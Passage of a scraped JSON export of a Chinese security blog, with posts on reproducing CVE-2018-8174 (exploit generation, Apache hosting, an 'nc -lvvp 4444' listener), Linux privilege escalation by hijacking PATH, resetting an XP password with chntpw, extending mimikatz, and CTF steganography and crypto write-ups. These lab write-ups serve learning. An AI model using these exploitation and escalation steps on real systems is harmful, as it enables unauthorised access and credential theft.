参考https://www.cnblogs.com/backlion/p/7243636.htmlhttps://github.com/ykoster/metasploit-framework/blob/b669b9fb81efdec4f59177116ee9524d71527d37/documentation/modules/exploit/windows/fileformat/cve_2017_8464_lnk_rce.mdhttps://3gstudent.github.io/3gstudent.github.io/Windows-Lnk%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2017-8464)%E5%88%A9%E7%94%A8%E6%B5%8B%E8%AF%95/","categories":[],"tags":[{"name":"CVE-2017-8464","slug":"CVE-2017-8464","permalink":"https://threst.github.io/tags/CVE-2017-8464/"}]},{"title":"双杀0day漏洞(CVE-2018-8174)复现","slug":"双杀0day漏洞(CVE-2018-8174)复现","date":"2018-09-09T14:13:14.000Z","updated":"2018-09-09T05:41:27.091Z","comments":true,"path":"2018/09/09/双杀0day漏洞(CVE-2018-8174)复现/","link":"","permalink":"https://threst.github.io/2018/09/09/双杀0day漏洞(CVE-2018-8174)复现/","excerpt":"","text":"漏洞描述：CVE-2018-8174 是 Windows VBScript Engine 代码执行漏洞。微软在4月20日早上确认此漏洞，并于5月8号发布了官方安全补丁，对该 0day 漏洞进行了修复，将其命名为 CVE-2018-8174由于 VBScript 脚本执行引擎(vbscript.dll)存在代码执行漏洞，攻击者可以将恶意的VBScript嵌入到Office文件或者网站中，一旦用户不小心点击，远程攻击者可以获取当前用户权限执行脚本中的恶意代码。 漏洞复现：攻击机 IP：192.168.1.101靶机 IP：192.168.1.111 github:https://github.com/Yt1g3r/CVE-2018-8174_EXP 0x01 生成payloadpython CVE-2018-8174.py -u http://192.168.1.101/ -o exp.rtf -i 192.168.1.101 -p 4444 -u:url地址-o: 输出文件-i：监听地址-p：监听端口 0x02 测试把 explot.html 复制到 /var/www/html/，并开启 apache 服务 sudo cp exploit.html /var/www/html/ 开启Apache服务sudo service apache2 start 攻击机监听端口nc -lvvp 4444 靶机使用IE打开URLhttp://192.168.1.101/exploit.html 靶机打开生成的Word文档也是一样的，可是我没测试成功","categories":[],"tags":[{"name":"CVE-2018-8174","slug":"CVE-2018-8174","permalink":"https://threst.github.io/tags/CVE-2018-8174/"}]},{"title":"ctf之隱寫術","slug":"CTF之隐写术","date":"2018-08-28T14:13:14.000Z","updated":"2018-08-28T03:32:30.290Z","comments":true,"path":"2018/08/28/CTF之隐写术/","link":"","permalink":"https://threst.github.io/2018/08/28/CTF之隐写术/","excerpt":"","text":"写在前面的话做了这么多的ctf比赛，告诉我个道理——再少不会少隐写！！！隐写题可是每次比赛都有的，But回顾过去，摸着自己的良心说那次解题不是用工具去套，套中了就解开了，没套中就凉了，于是在这种大背景下，我打算写一篇关于隐写的系(xia)统(che）的文章。各位师傅看就看，别骂人。 what is 隐写？参考百度上面说就是：隐写术(Steganography)是一门关于信息隐藏的技巧与科学，所谓信息隐藏指的是不让除预期的接收者之外的任何人知晓信息的传递事件或者信息的内容。这里提到了信息隐藏技术，粗略的说下，信息隐藏技术不仅仅只包括隐写术，还有数字水印，隐蔽信道，阀下信道，匿名通信这几种，但是我们都不需要了解，其中数字水印主要应用于产权保护，而隐写术主要应用于通信。 隐写术应用场景要说隐写术的应用不得不提下伟大的Simmons模型，由于最近在看&lt;你好，旧时光&gt;(真心好看)，就拿林杨和余周周来打比方。1.林杨和余周周分属两个教室，一个文科，一个理科。2.为了将同学情谊升华需要进行通信，而通信的短信必须经过中间的潘主任的审阅。3.潘主任可以阅读短信的内容，而且阅读后可以判断他们是否早恋。 分析：加密短信方法不可取，因为潘主任会阅读传送的信息的内容，加密后的信息大概率会引起潘主任的怀疑，潘主任可以以此为依据对他们进行调查。因此林杨和余周周需要一种对通信过程隐藏的手段。这么分析一下，可能很多同学对密码学和隐写术产生了困惑，什么时候用隐写，什么时候用密码？密码学与隐写术要根据请情况的不同来选择。密码学：试图通过对信息加密的方式，使信息变得无意义，继而使他人无法获得真正的信息。隐写术：试图隐藏通信事件本身。但他们都有相同目的都是为了针对第三方，在隐蔽性方面(总体上)隐写&gt;加密。因为加密后的文本通常为无意义文本，较易察觉(当然也存在诸如培根密码等密文为有意义文本的加密方式),但在安全性上面(总体上)加密&gt;隐写,隐写方式或算法一但被识别，通常也就取得信息了，但是加密通常即使知道加密算法也无法解出明文(不考虑碰撞)。 现代数字隐写四大载体 1.文本：字体、空格、标点、行间距等2.图像：各类图片格式特征(png、jpg、bmp)3.音频：mp3 stego、波形图、频谱图4.视频：压缩视频、未压缩视频 关于CTF比赛在ctf比赛中隐写套路较为固定比赛工具较为成熟。好处：通常题目难度较低，即使没有解题思路，依次尝试各个解法往往也能在没发现提示的情况下找出问题所在。坏处：容易形成思维定势，一旦题目考察方式不常规，往往容易无从下手，不知道从哪开始去分析，失去独立发现问题和思考的能力。通常作为MISC类题目的一个考察方向，(这里MISC泛指Misc &amp; Steganography &amp; forensic &amp; Crypto)，因为不作为单独分类，因此隐写术通常只是一道Misc题中的一部分，与其他考察方向共同构成一道完整的Misc题。在国外CTF比赛中以计算机取证(Forensics)类的题目出现。 CTF比赛中的典型隐写分析工具Binwalk固件分析工具，常用作路由器逆向、后门分析，或识别二进制图像中的嵌入式文件和可执行代码常用参数：123命令：binwalk -e firmware.bin——选项“-e&quot;和“--extract&quot;用于按照定义的配置文件中的提取方法从固件中提取探测到的文件系统。命令：binwalk -Me firmware.bin——选项“-M&quot;和“--matryoshka&quot;用于根据magic签名扫描结果进行递归提取，仅对&quot;-e&quot;和“--dd&quot;选项有效。命令：binwalk -Me -d 5 firmware.bin——选项“-d&quot;和“--depth=&lt;int&gt;&quot;用于限制递归提取深度，默认深度为8，仅当“-M&quot;选项存在时有效。 Stegsolve图片通道查看器,常用参数：123456Analyse下拉菜单：File Format：查看文件格式和参数信息，有时候flag会写在图片信息里Data Extract：数据提取，如LSB隐写等在这个选项中提取信息Stereogram solver：立体视图，可以左右移动控制偏移量Frame Broswer：逐帧浏览，如查看快速闪过的GIF图中的flagImage Combiner：图片结合，可以对两张图片做xor、add、sub等运算 StegDetect数字图像隐写分析工具，主要针对JPEG,常用参数：123456789-q 仅显示可能包含隐藏内容的图像。-n 启用检查JPEG文件头功能，以降低误报率。如果启用，所有带有批注区域的文件将被视为没有被嵌入信息。如果JPEG文件的JFIF标识符中的版本号不是1.1，则禁用OutGuess检测。-s 修改检测算法的敏感度，该值的默认值为1。检测结果的匹配度与检测算法的敏感度成正比，算法敏感度的值越大，检测出的可疑文件包含敏感信息的可能性越大。-d 打印带行号的调试信息。-t 设置要检测哪些隐写工具（默认检测jopi），可设置的选项如下：j 检测图像中的信息是否是用jsteg嵌入的。o 检测图像中的信息是否是用outguess嵌入的。p 检测图像中的信息是否是用jphide嵌入的。i 检测图像中的信息是否是用invisible secrets嵌入的。 Foremost基于文件开始格式，文件结束标志和内部数据结构进行恢复文件的程序。1234567891011-V - 显示版权信息并退出-t - 指定文件类型. (-t jpeg,pdf ...) -d -打开间接块检测 (针对UNIX文件系统) -i - 指定输入文件 (默认为标准输入) -a - 写入所有的文件头部, 不执行错误检测(损坏文件) -w - 向磁盘写入审计文件，不写入任何检测到的文件-o - 设置输出目录 (默认为为输出)-c - 设置配置文件 (默认为 foremost.conf)-q - 启用快速模式. 在512字节边界执行搜索.-Q - 启用安静模式. 禁用输出消息. -v - 详细模式. 向屏幕上记录所有消息。 stringsstrings命令在对象文件或二进制文件中查找可打印的字符串。字符串是4个或更多可打印字符的任意序列，以换行符或空字符结束。 strings命令对识别随机对象文件很有用。1234-a --all：扫描整个文件而不是只扫描目标文件初始化和装载段-f –print-file-name：在显示字符串前先显示文件名-t --radix=&#123;o,d,x&#125; ：输出字符的位置，基于八进制，十进制或者十六进制-e --encoding=&#123;s,S,b,l,B,L&#125; ：选择字符大小和排列顺序:s = 7-bit, S = 8-bit, &#123;b,l&#125; = 16-bit, &#123;B,L&#125; = 32-bit 常见文件格式what is 文件格式?文件格式（或文件类型）是指电脑为了存储信息而使用的对信息的特殊编码方式，是用于识别内部储存的资料。比如有的储存图片，有的储存程序，有的储存文字信息。每一类信息，都可以一种或多种文件格式保存在电脑存储中。每一种文件格式通常会有一种或多种扩展名可以用来识别，但也可能没有扩展名。扩展名可以帮助应用程序识别的文件格式。 文件头文件头就是是位于文件开头的一段承担一定任务的数据。一般都在开头的部分。以jpg图片和zip压缩包文件为例。图6和图7分别是jpg图片的文件头以及jpg图片的结尾。 txt格式txt是微软在操作系统上附带的一种文本格式，是最常见的一种文件格式 ，早在DOS时代应用就很多，主要存文本信息，即为文字信息，现在的操作系统大多使用记事本等程序保存，大多数软件可以查看，如记事本，浏览器等等。 doc/docx格式doc即document的缩写，docx在doc的基础上加入了xml，通常是指Microsoft Office Word软件创建的文件格式，docx实际上是作为一个zip压缩方式的压缩文件，docx相对doc体积更小，支持的对象更多，同常采用AOPR的工具爆破docx的难度更大。doc和docx中内容一样，docx比doc相比，体积更小。注意这里标记的pk，其实docx可以讲是一种zip文件。我们把后缀名改成zip试试。可以看到，可以用解压软件打开。 png格式属于无损压缩的位图格式，他采用LZ77的派生算法进行压缩，压缩比高，文件体积小，同时不损失颜色和数据，一个png文件可以由一个文件头标志和若干个数据块构成，而数据块有可以分为关键数据块和辅助数据块，每一类数据块又包含若干具体的数据块部分。 拿张png的图片来举个例子．丢到winhex中分析，对于一个PNG文件来说，其文件头总是由位固定的字节来描述的，剩余的部分由 3 个以上的 PNG 的数据块（Chunk）按照特定的顺序组成。PNG图片是有两种数据块的，一个是叫关键数据块，另一种是辅助数据块。正常的关键数据块，定义了4种标准数据块，每个PNG文件都必须包含它们。一般格式： 1文件头 89 50 4E 47 0D 0A 1A 0A+数据块+数据块+数据块…… jpeg格式JPEG 是有损压缩格式，将像素信息用JPEG保存成文件再读取出来，其中某些像素值会有少许变化。在保存时有个质量参数可在0至100之间选择，参数越大图片就越保真，但图片的体积也就越大。一般情况下选择 70 或 80 就足够了,png主要是块，而jpeg主要是以段的形式一样拿张图片做栗子，注意jpg文件有些段是没有长度描述也没有内容，只有段标识和段类型。比如文件头和文件尾均属于这种段，段与段之间无论有多少 FF都是合法的，这些FF称为「填充字节」，必须被忽略掉。0xffd8和 0xffd9为 JPG 文件的开始结束的标志 bmp格式是windows的标准图像文件格式，通常情况下采用位映射存储格式，除了图像的深度(可以理解为控制色彩的能力)可选外，不采用任何其他的压缩方式，因此bmp的图像质量非常高，体积也非常大，bmp图像通常可以分为设备相关位图和设备无关位图两大类，一个bmp的文件格式通常由文件头，信息头，颜色信息和位图数据四部分组成文件头:前面两个字节一般42 4D，随后4个字节表示位图大小,再后面4个字节为保留位设置为0,再后面的4个字节非常关键，表示文件头到位图数据的偏移量 其中图像文件头。0x4d42=’BM’，表示是Windows支持的BMP格式。(注意：查ascii表B 0x42,M0x4d,bfType为两个字节，B为low字节，M为high字节所以bfType=0x4D42，而不是0x424D，请注意)https://baike.baidu.com/item/BMP/35116 gifgif就是我们经常看见的动图,比如各种表情包,从文件格式来讲它也是一种无损压缩，它存储的不是颜色的本身，而是该点的颜色列表的索引值，其内部分成许多存储快，可以用来存储多副图像或者是决定图像表现行为的控制块，继而实现动图和交互式应用，一个gif图像通常由文件头，gif数据流和文件终结器三个部分组成，目前常见的有87(不支持动图)和89两个版本. 我们还是用一张git图来举栗子 &lt;GIF数据流&gt; ::= 头部 &lt;；逻辑视屏&gt; &lt;；数据&gt;* 尾记录,这个规则将；实体定义如下。它必须以头部开始，头部后面接一个逻辑视屏实体，该实体要用其他规则来定义。最后，数据实体接结束符。数据实体后面的*表示数据实体可以在此位置出现0或多次。1234567&lt;Gif 数据流&gt; ::= 头部 &lt;；逻辑视屏&gt; &lt;；数据&gt;* 尾记录&lt;；逻辑视屏&gt; ::= 逻辑视屏描述块 [全局色表]&lt;；数据&gt; ::= &lt;；成象块&gt; |&lt;；特殊用途块&gt;&lt;；成象块&gt; ::= [图象控制扩充] &lt;；成象块&gt;&lt;；成象块&gt; ::= &lt;；基于表的图象&gt; |纯文本扩充&lt;；基于表的图象&gt; ::= 图象描述符 [局部色表] 图象数据&lt;；特殊用途块&gt; ::= 应用扩充 |注释扩充 mp3mp3格式是在音频隐写中常见的一种格式,mp3即MPEG-a Audio Layer-3的简称，根据压缩质量和编码的复杂程度可以大致分为3层，分别对应与mp1,mp2,mp3,这三种有损压缩的声音文件，根据用途的不同，每层采用的编码方式也不同，其编码层次越高，编码器就越复杂，压缩率也高，一个mp3文件大致可以分成TAG_V2,Frame,TAG_V1三部分，其中frame是构成mp3的最小组成单位。拿十三哥的音频来举个例子,使用audacity工具可以查看mp3的波形图,频谱图.","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://threst.github.io/tags/ctf/"}]},{"title":"艰难的kali破解xp开机密码之路","slug":"kali破解xp开机密码","date":"2018-06-15T14:13:14.000Z","updated":"2018-06-15T14:30:58.014Z","comments":true,"path":"2018/06/15/kali破解xp开机密码/","link":"","permalink":"https://threst.github.io/2018/06/15/kali破解xp开机密码/","excerpt":"","text":"背景今天一个妹子来找我，说开机密码忘记了，说是妹子其实根本没看见人——因为是他男朋友送电脑过来的，刺激！！ win10pe初尝试拿到电脑那一刻，懵懂了，这哪是电脑，这根本就是十年前的古董啊！！病毒运行起来都卡，一大堆问题，本来是想直接用微pe盘破解（微pe真心好用），哪想这古董识别不了u盘 古董照片 kali大法好正好威神那里有kali的启动盘，抱着试一试的想法插入了，啊！居然可以识别，直接设为u盘启动，开启kali参考:https://blog.csdn.net/qq_31481187/article/details/52602454先挂载windows的系统盘，打开终端，输入cd /WINDOWS/system32/config 然后使用chntpw神器chntpw -l SAM 看见Administrator用户 输入：chntpw -u Adminstrator SAM 要你选择 选择2解锁密码,最后退出的时候要需选择y，因为第一次选择1,退出输入n结果并没有改密码在输入chntpw -u Adminstrator SAM检查下已经是blank了 最后","categories":[],"tags":[{"name":"瞎记罢写","slug":"瞎记罢写","permalink":"https://threst.github.io/tags/瞎记罢写/"}]},{"title":"利用 PATH 环境变量进行 Linux 提权","slug":"利用 PATH 环境变量进行 Linux 提权","date":"2018-06-06T03:13:14.000Z","updated":"2018-06-06T03:14:01.687Z","comments":true,"path":"2018/06/06/利用 PATH 环境变量进行 Linux 提权/","link":"","permalink":"https://threst.github.io/2018/06/06/利用 PATH 环境变量进行 Linux 提权/","excerpt":"","text":"高考加油写在前面的话在解决了几个OSCP挑战之后，我决定写一篇关于用于Linux提权方法的文章，这对我们的渗透测试项目很有帮助。在本文中，我们将学习“操纵$PATH变量的各种方法”，以获得远程主机的根访问权，以及CTF challenges用于提权的$PATH漏洞的技术。 介绍PATH是Linux和unix操作系统中的环境变量，它存储可执行程序的所有bin和sbin目录。当用户在终端上运行命令时，它对shell的请求是根据用户执行的命令在PATH变量的帮助下搜索可执行文件。超级用户通常还拥有/sbin和/usr/sbin条目，以便轻松执行系统管理命令。使用echo命令查看用户路径。echo $PATH/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games 如果你注意到’.’在环境路径变量中，这意味着被记录的用户可以从当前目录执行二进制文件/脚本。 方法1目前，我们在/home/raj目录中，我们将创建一个名称为/script的新目录。现在在脚本目录中，我们将编写一个小c程序来调用系统二进制文件的函数。1234pwdmkdir scriptcd /scriptnano demo.c 你可以在我们的演示中看到我们的demo.c调用ps系统二进制文件命令。 然后使用gcc编译demo.c文件并将SUID权限提升到已编译文件。1234lsgcc demo.c -o shellchmod u+s shellls -la shell 受害者的机虚拟机首先，你需要破坏目标系统然后进入特权升级阶段。假设您通过ssh成功登录到受害者的机器。然后在查找命令的帮助下搜索具有SUID或4000权限的文件。 1find / -perm -u=s -type f 2&gt;/dev/null 在上面的命令的帮助下，攻击者可以枚举任何可执行文件，这里我们还可以观察/home/raj/script/shell具有suid权限。 然后我们进入/home/raj/script并看到一个可执行文件“shell”。我们运行这个文件，它看起来像正在运行ps，这是进程状态的一个真正的文件。 12ls./shell Echo Command12345678cd /tmpecho “/bin/sh” &gt; pschmod 777 psecho $PATHexport PATH=/tmp:$PATHcd /home/raj/script./shellwhoami Copy Command123456cd /home/raj/script/cp /bin/sh /tmp/psecho $PATHexport PATH=/tmp:$PATH./shellwhoami Symlink command12345ln -s /bin/sh psexport PATH=.:$PATH./shellidwhoami 注意:符号链接也被称为符号链接，如果该目录具有完整的权限，它将成功地工作。在Ubuntu中，对于符号链接，我们给了/script目录的权限777。因此，我们看到攻击者可以操纵环境变量路径来升级特权并获得根访问。 方法2重复上述步骤来配置您自己的环境中，我们将编写一个小c程序来调用系统二进制文件的功能。1234pwdmkdir scriptcd /scriptnano demo.c 你可以在我们的demo.c正在调用id命令–它是系统二进制文件。 然后使用gcc编译demo.c文件并将SUID权限提升到已编译文件。1234lsgcc demo.c -o shell2chmod u+s shell2ls -la shell2 受害者的虚拟机再一次，你需要破坏目标系统然后进入特权升级阶段。假设您通过ssh成功登录到受害者的机器。然后在查找命令的帮助搜索具有SUID或4000权限的文件。在这里，我们还可以观察/home/raj/script/shell2具有suid权限。 1find / -perm -u=s -type f 2&gt;/dev/null 然后我们进入/home/raj/script，并看到一个可执行文件“shell2”。我们运行这个文件，它看起来像正在运行id。 123cd /home/raj/scriptls./shell2 Echo command12345678cd /tmpecho “/bin/sh” &gt; idchmod 777 idecho $PATHexport PATH=/tmp:$PATHcd /home/raj/script./shell2whoami Method 3重复以上步骤，设置您自己的环境确保我们的demo.c文件可以调用cat命令从内部读取内容etc/passwd文件。然后使用gcc编译demo.c文件并将SUID权限提升到已编译文件。1234lsgcc demo.c -o rajchmod u+s rajls -la raj 受害者的虚拟机再次破坏受害者的系统，然后转移到权限升级阶段，执行下面的命令来查看sudo用户列表。1find / -perm -u=s -type f 2&gt;/dev/null 在这里，我们还可以观察/home/raj/script/raj具有suid权限，然后进入/home/raj/script并看到一个可执行文件“raj”。所以当我们运行这个文件时，它就会输出etc/passwd文件。123cd /home/raj/script/ls./raj Nano Editor12cd /tmpnano cat 现在在终端输入/bin/bash当并保存它。 1234567chmod 777 catls -al catecho $PATHexport PATH=/tmp:$PATHcd /home/raj/script./rajwhoami 方法4重复以上步骤，设置您自己的环境确保我们的demo.c文件可以调用cat命令来读取msg.txt是在/home/raj里面,但是/home/raj里面没有这样的文件,然后使用gcc编译demo.c文件并将SUID权限提升到已编译文件。 1234lsgcc demo.c -o ignitechmod u+s ignitels -la ignite 受害者的虚拟机再次损害受害者的系统，然后转移到特权升级阶段，并执行下方命令以查看sudo用户列表。1find / -perm -u=s -type f 2&gt;/dev/null 在这里，我们还可以观察/home/ raj/script/拥有suid权限，然后我们进入/home/raj/script，看到一个可执行文件“ignite”。因此，当我们运行这个文件时，它会把一个错误“cat: /home/raj/msg.”txt”的结果。 123cd /home/raj/scriptls./ignite Vi Editor12cd /tmpvi cat 现在在终端输入/bin/bash当并保存它。 1234567chmod 777 catls -al catecho $PATHexport PATH=/tmp:$PATHcd /home/raj/script./ignitewhoami 本文翻译:http://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/","categories":[],"tags":[{"name":"安全客弃婴","slug":"安全客弃婴","permalink":"https://threst.github.io/tags/安全客弃婴/"}]},{"title":"61随想","slug":"61随想","date":"2018-06-01T14:13:14.000Z","updated":"2018-06-01T14:58:02.906Z","comments":true,"path":"2018/06/01/61随想/","link":"","permalink":"https://threst.github.io/2018/06/01/61随想/","excerpt":"","text":"今天是国际儿童节,可能每个人心里都住着一个孩子,动态朋友圈都是关于61礼物的,连室友都回长沙陪女朋友了,我就不一样了,买的内存和电脑都到了,装上之后确实不一样了,可以愉快的开虚拟机了!!其实今天还是大四的毕业晚会,想想三年之后就是我们了,现在还是这么菜,每天还是CTAL+V,还是要多看书,又想起高三的生活,转眼一年过去了,根据朋友圈的动态来分析,他们过的都还好,离2018高考也只有6天了,一起加油吧!","categories":[],"tags":[{"name":"瞎记罢写","slug":"瞎记罢写","permalink":"https://threst.github.io/tags/瞎记罢写/"}]},{"title":"常见文件格式分析","slug":"常见文件格式分析","date":"2018-06-01T14:13:14.000Z","updated":"2018-06-01T14:32:07.045Z","comments":true,"path":"2018/06/01/常见文件格式分析/","link":"","permalink":"https://threst.github.io/2018/06/01/常见文件格式分析/","excerpt":"","text":"文件格式概述文件格式实质上是信息的一种特殊的编码方式，计算机在存储信息时，由于信息种类的不同，所采取的文件格式也不同，在windows系统中，计算机通常采用扩展名的方式来区分不同的文件格式，ctf中考察文件格式大致分为4的类： 文本格式：.txt,.doc,.docx 图像格式：.png,.jpg,bmp,.gif 音频格式:.mp3,.wma,.wav 视频格式:.mp4,.rmvb,.avi txt格式txt即英文text的缩写，通常是指windows操作系统自带的一种纯文本文件格式 doc/docx格式doc即document的缩写，docx在doc的基础上加入了xml，通常是指Microsoft Office Word软件创建的文件格式，docx实际上是作为一个zip压缩方式的压缩文件，的哦出现相对doc体积更小，支持的对象更多，同常采用AOPR的工具爆破docx的难度更大 png格式89 50 4e 47 0d 0a 1a属于无损压缩的位图格式，他采用LZ77的派生算法进行压缩，压缩比高，文件体积小，同时不损失颜色和数据，一个png文件可以由一个文件头标志和若干个数据块构成，而数据块有可以分为关键数据块和辅助数据块，每一类数据块又包含若干具体的数据块部分 wiki:https://ctf-wiki.github.io/ctf-wiki/misc/picture/png/ jpeg格式属于有损压缩的与平台无关的图像格式，jpeg的压缩比高(可高达100：1),png主要是块，而jpeg主要是以段的形式wiki:https://ctf-wiki.github.io/ctf-wiki/misc/picture/jpg/ bmp格式是windows的标准图像文件格式，通常情况下采用位映射存储格式，除了图像的深度(可以理解为控制色彩的能力)可选外，不采用任何其他的压缩方式，因此bmp的图像质量非常高，体积也非常大，bmp图像通常可以分为设备相关位图和设备无关位图两大类，一个bmp的文件格式通常由文件头，信息头，颜色信息和位图数据四部分组成文件头:前面两个字节一般42 4D，随后4个字节表示位图大小,再后面4个字节为保留位设置为0,再后面的4个字节非常关键，表示文件头到位图数据的偏移量 gif格式也是一种无损压缩，它存储的不是颜色的本身，而是该点的颜色列表的索引值，其内部分成许多存储快，可以用来存储多副图像或者是决定图像表现行为的控制块，继而实现动图和交互式应用，一个gif图像通常由文件头，gif数据流和文件终结器三个部分组成，目前常见的有87(不支持动图)和89两个版本wiki:https://ctf-wiki.github.io/ctf-wiki/misc/picture/gif/ mp3mp3即MPEG-a Audio Layer-3的简称，根据压缩质量和编码的复杂程度可以大致分为3层，分别对应与mp1,mp2,mp3,这三种有损压缩的声音文件，根据用途的不同，每层采用的编码方式也不同，其编码层次越高，编码器就越复杂，压缩率也高，一个mp3文件大致可以分成TAG_V2,Frame,TAG_V1三部分，其中frame是构成mp3的最小组成单位","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://threst.github.io/tags/ctf/"}]},{"title":"如何在MIMIKATZ添加模块","slug":"如何在MIMIKATZ添加模块","date":"2018-06-01T09:33:09.000Z","updated":"2018-06-01T14:47:58.943Z","comments":true,"path":"2018/06/01/如何在MIMIKATZ添加模块/","link":"","permalink":"https://threst.github.io/2018/06/01/如何在MIMIKATZ添加模块/","excerpt":"","text":"嗨，大家好 ！我今天要写关于“我怎样才能添加到模块到mimikatz中？”首先，你必须在github中克隆或下载。我使用Visual Studio Community 2015来打开该项目。 在尝试添加新模块之前，我们必须构建mimikatz项目。如果这里失败了，记得在下一次操作之前先修复你的开发环境。我试过了，结果成功了，让我们继续，我们在/ mimikatz / modules中创建自己的模块头和C文件，在这里： /mimikatz/modules/kuhl_m_littlePrince.c /mimikatz/modules/kuhl_m_littlePrince.h 我将讨论在检查项目时使用的一些全局变量。了解它们的用途将有助于我们开发模块。比如全局变量kuhl_m_littlePrince＆ kuhl_m_c_littlePrince。或这些类型的全局变量：KUHL_M和KUHL_M_C。“KUHL_M”表示Kiwi用户级高级模块。KUHL_M是由kuhl_m.h中的“struct _KUHL_M”定义的结构。 123456789typedef struct _KUHL_M &#123; const wchar_t * shortName; const wchar_t * fullName; const wchar_t * description; const unsigned short nbCommands; const KUHL_M_C * commands; const PKUHL_M_C_FUNC_INIT pInit; const PKUHL_M_C_FUNC_INIT pClean;&#125; KUHL_M, *PKUHL_M; 在kuhl_m.h中定义的struct KUHL_M或 * PKUHL_M`，这个结构的参数为： 1.shortName用作模块名称，2.fullName用于列出显示名称3.描述用于描述模块4.nbcommand用于命令的数量。5.命令使用KUL_M_C中定义的模块函数列表6.由于“PKUHL_M_C_FUNC_INIT”定义的名称是指NTSTATUS。pInit和pClean是NTSTATUS的变量类型。 PINIT＆pClean功能不是强制性的，只是为了调用函数之前初始化模块，则当模块被卸载的原型为PINIT＆pClean相同：NTSTATUS kuhl_m_modulename_init/clean() “KUHL_M_C”表示Kiwi用户级高级模块命令。 wchar_t是“无符号短”。PKUHL_M_C_FUNC定义了一个类型为“NTSTATUS”的函数 12345typedef struct _KUHL_M_C &#123; const PKUHL_M_C_FUNC pCommand; const wchar_t * command; const wchar_t * description;&#125; KUHL_M_C, *PKUHL_M_C; 1.pCommand是我们的模块功能2.“command”说我们如何在终端中调用这个模块3.描述是对函数做什么的简要描述NTSTATUS类型在Ntdef.h中定义，系统提供的状态码在Ntstatus.h中定义。NTSTATUS值用于传递系统信息。它们有四种类型：成功值，信息值，警告和错误值 NTSTATUS kuhl_m_modulename_functioname（int argc，wchar_t * argv []）;它可以在NTSTATUS中返回它想要的内容，除了：STATUS_FATAL_APP_EXIT，需要退出mimikatz。 我们在头文件中做了必要的声明并传递给了主文件。 我们用kuhl_m_modulename.h＆kuhl_m_modulename.c创建了我们的模块。最后一步我们需要在mimikatz.h中添加模块，然后在mimikatz.c模块列表中添加全局变量。 模块列表 你现在可以建立mimikatz，然后运行它！ 如果你看到下面这个消息，那么你成功了！ 祝你有美好的一天^^ 本文翻译:https://littlesecurityprince.com/security/2018/03/18/ModuleMimikatz.html","categories":[],"tags":[{"name":"安全客弃婴","slug":"安全客弃婴","permalink":"https://threst.github.io/tags/安全客弃婴/"}]},{"title":"实验吧wp(持续更新)","slug":"实验吧wp","date":"2018-05-30T14:13:14.000Z","updated":"2018-06-01T14:29:42.245Z","comments":true,"path":"2018/05/30/实验吧wp/","link":"","permalink":"https://threst.github.io/2018/05/30/实验吧wp/","excerpt":"","text":"密码学疑惑的汉字题目： 现有一段经过加密的密文，内容如下：王夫 井工 夫口 由中人 井中 夫夫 由中大。请找出这段密文隐藏的消息明文。 格式：CTF{ } 解题链接： http://ctf5.shiyanbar.com/423/crypto/1.html 当铺密码:就是一种将中文和数字进行转化的密码，算法相当简单:当前汉字有多少笔画出头，就是转化成数字几1 2 3 4 5 6 7 8 9由 中 人 工 大 王 夫 井 羊所以王夫 井工 夫口 由中人 井中 夫夫 由中大：67 84 70 123 82 77 125CTF{RM} 凯撒和某某加密题目：aZZg/x\\ZbavpZiEZp+n)o+ writeup：这是整个ascii表的凯撒移动，我参照网上提供一个py代码： 1234567891011121314#coding:utf-8import stringdef foo(): s=\"aZZg/x\\ZbavpZiEZp+n)o+\" #ascii码表中可打印的字符 a=string.maketrans('', '')[33:127] for n in xrange(0,26): b=a[n:]+a[:n] table=string.maketrans(a,b) print string.translate(s,table) passif __name__ == '__main__': foo() print 'ok' aZZg/x\\ZbavpZiEZp+n)o+b[[h0y][cbwq[jF[q,op,c\\i1z^\\dcxr\\kG\\r-p+q-d]]j2{_]edys]lH]s.q,r.e^^k3|^fezt^mI^t/r-s/ f__l4}a_gf{u_nJ_u0s.t0 g`m5~bhg|voK`v1t/u1haan6!caih}wapLaw2u0v2ibbo7”dbji~xbqMbx3v1w3jccp8#eckj!ycrNcy4w2x4kddq9$fdlk”zdsOdz5x3y5leer:%geml#{etPe{6y4z6mffs;&amp;hfnm$|fuQf|7z5{7nggt&lt;’igon%}gvRg}8{6|8ohhu=(jhpo&amp;~hwSh~9|7}9piiv&gt;)kiqp’!ixTi!:}8~:qjjw?ljrq(“jyUj”;~9!;rkkx@+mksr)#kzVk#&lt;!:”&lt;sllyA,nlts$l{Wl$=”;#=tmmzB-omut+%m|Xm%&gt;#&lt;$&gt;unn{C.pnvu,&amp;n}Yn&amp;?$=%?voo|D/qowv-‘o~Zo‘@%&gt;&amp;@wpp}E0rpxw.(p![p(A&amp;?’Axqq~F1sqyx/)q”\\q)B‘@(Byrr!G2trzy0r#]rC(A)Czss”H3us{z1+s$^s+D)BDok 注意这一行：f__l4}a_gf{u_nJ_u0s.t0栅栏密码特点就是隔几个字母能读顺成一个单词，一般译为分2个一组具体情况具体分析，就像此题一处特殊单独三个一组。观察敏感得知，反正有奇葩字符肯定不是，看有没有{，}，CTF,flag这种字符得知：f__l4}a_gf{u_nJ_u0s.t0进行解密： f__ =&gt;f _ _l4} =&gt;l 4 }a_ =&gt;a _gf =&gt;g f{u =&gt;{ un =&gt; nJ_ =&gt;J _u0 =&gt;u 0s. =&gt;s .t0 =&gt;t 0 结果就是flag{_Just_4_fun_0.0_} keyboard 题目：提示：和键盘有关解题链接： http://ctf5.shiyanbar.com/360/keyboard.html writeup：打开网页后看到：BHUK,LP TGBNHGYT BHUK,LP UYGBN TGBNHGYT BHUK,LP BHUK,LP TGBNHGYT BHUK,LP TGBNHGYT UYGBN根据题目提示，我发现这些在键盘上排列出一个英文字母..（这些明显是密室逃脱的套路）BHUK,LP对应N，TGBNHGYT对应B，UYGBN对应C flag:NBNCBNNBNBC 密文 rot1357R9S980RNOS49973S757PQO9S80Q36P （md5不解密）解密网站flag:57E9F980EABF49973F757CDB9F80D36C 他的情书 从前从前,有个人爱你很久很久格式：ctf{}解题链接： http://ctf5.shiyanbar.com/crypto/4f12查看源码 